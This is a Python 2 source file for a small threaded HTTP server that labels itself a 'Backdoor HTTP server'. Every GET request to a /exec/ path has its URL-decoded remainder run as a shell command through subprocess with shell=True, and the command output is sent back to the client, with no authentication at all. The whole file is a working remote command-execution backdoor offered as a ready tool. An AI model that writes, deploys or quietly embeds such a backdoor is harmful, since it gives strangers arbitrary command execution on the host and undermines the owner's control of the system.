__author__ = 'yugarsi'
import os
import subprocess
import socket
import time
import signal
import sys
import threading
from urllib import unquote  #for parsing the url
import StringIO



class requestResponseHandler:

    def __init__(self, message):
        self.message = message

    def processMessage(self):
        try:

            reqMethod = self.message.split(' ')[0]
            reqMethod = reqMethod.encode('ascii', 'ignore')
            print ("Method: ", reqMethod)
            mappedMsg = unquote(self.message)

            #print mappedMsg
            type = mappedMsg.split("HTTP/1.1\r\n")[0].strip()


            print type

            if (reqMethod == 'GET'):
                if ("/exec/" in type):
                    command = type.rpartition("/exec/")[-1].strip()
                    #print command
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    output = process.communicate()
                    body = (output[0]+output[1])
                    responseHeaders = self.generateResponseHeaders(200)
                    responseBody = body
                    try:
                        process.kill()
                    except:
                        print("subprocess already stopped")

                else:
                    print ("Warning: Serving response code 404\n")
                    responseHeaders = self.generateResponseHeaders(404)
                    responseBody = b"<html><body><p>Error 404: File not found</p><p>Backdoor HTTP server</p></body></html>"

                serverResponse =  responseHeaders.encode() # return headers
                serverResponse +=  responseBody  # add additional content body
                return serverResponse

            else:
                responseHeaders = self.generateResponseHeaders(501)
                responseBody = b"<html><body><p>Error 501: Not Implemented</p><p>Backdoor HTTP server</p></body></html>"
                serverResponse =  responseHeaders.encode() # return headers
                serverResponse +=  responseBody  # add additional content body
                print("Unhandled HTTP request method:", reqMethod)
                return serverResponse
        except Exception as e:
            print e
            print ("Warning: Serving response code 404\n")
            responseHeaders = self.generateResponseHeaders( 404)
            responseBody = b"<html><body><p>Error 404: File not found</p><p>Backdoor HTTP server</p></body></html>"
            serverResponse =  responseHeaders.encode()
            serverResponse +=  responseBody
            return serverResponse

    def generateResponseHeaders(self,  httpCode , encoding = "plaintext"):

        """ Generates HTTP response Headers. Ommits the first line! """
        # determine response code
        header = ''

        if (httpCode == 200):
            header = 'HTTP/1.1 200 OK\n'
            header += 'Server: Backdoor-HTTP-Server\n'
            header += 'Connection: close\n\n'  # Indicate that HTTP conection wil be closed after sending response

        elif(httpCode == 404):
            header = 'HTTP/1.1 404 Not Found\n'
            # write further headers
            header += 'Server: Backdoor-HTTP-Server\n'
            header += 'Connection: close\n\n'  # Indicate that HTTP conection wil be closed after sending response

        elif(httpCode == 501):
            header = 'HTTP/1.1 501 Not Implemented\n'
            header += 'Server: Backdoor-HTTP-Server\n'
            header += 'Connection: close\n\n'

        return header



class HttpServer:
    def __init__(self, port = 80):
        self.host = ''   # choose any interface
        self.port = port

    def startServer(self):

        """ Starts the http server on a specific port"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
             print("Starting HTTP server on ", self.host, ":",self.port)
             self.socket.bind((self.host, self.port))

        except Exception as e:
            print ("Warning: Can't acquire port due to access privileges",self.port,"\n")
            sys.exit(1)

        print ("Server successfully acquired the socket with port:", self.port)
        print ("Press Ctrl+C to shut down the server and exit.")
        self.connectionWait()


    def connectionWait(self):

        """ Main loop to wait for connections connections """
        while True:
            print ("Waiting for new Connection")
            self.socket.listen(2)  # maximum number of queued connections
            connSocket, addr = self.socket.accept()
            # connSocket - socket to client
            # addr - clients address
            newThread = handleParallelConnections(connSocket , addr)
            newThread.start()



    def shutdown(self):

        # """ Shut down HttpServer """
        try:
            print("Shutting down the server")
            self.socket.shutdown(socket.SHUT_RDWR)


        except Exception as e:
            print e
            sys.exit(1)



class handleParallelConnections(threading.Thread):

    def __init__(self,  socket, addr):
        threading.Thread.__init__(self)
        self.addr = addr
        self.socket = socket
        #self.fileDirectory = fileDirectory
        print ("New thread started for "+str(addr))

    def run(self):
        data = self.socket.recv(1024)
        message = bytes.decode(data)
        obj = requestResponseHandler(message)
        response = obj.processMessage()
        self.socket.send(response)
        print ("Closing the connection .. ")
        self.socket.close()



def gracefulShutdownBySignal(sig, dummy):
    """ This function is to shut down the Server it is triggered by SIGINT signal from signal library"""
    # cleanup_stop_thread();
    serverObj.shutdown()
    sys.exit(1)


clearFlag = "\r\n\r\n"
# press ctrl+c for server shutdown
signal.signal(signal.SIGINT, gracefulShutdownBySignal)
print("Starting web server")
port = sys.argv[1]
serverObj = HttpServer(int(port))  # construct server object
serverObj.startServer() # aquire the socket



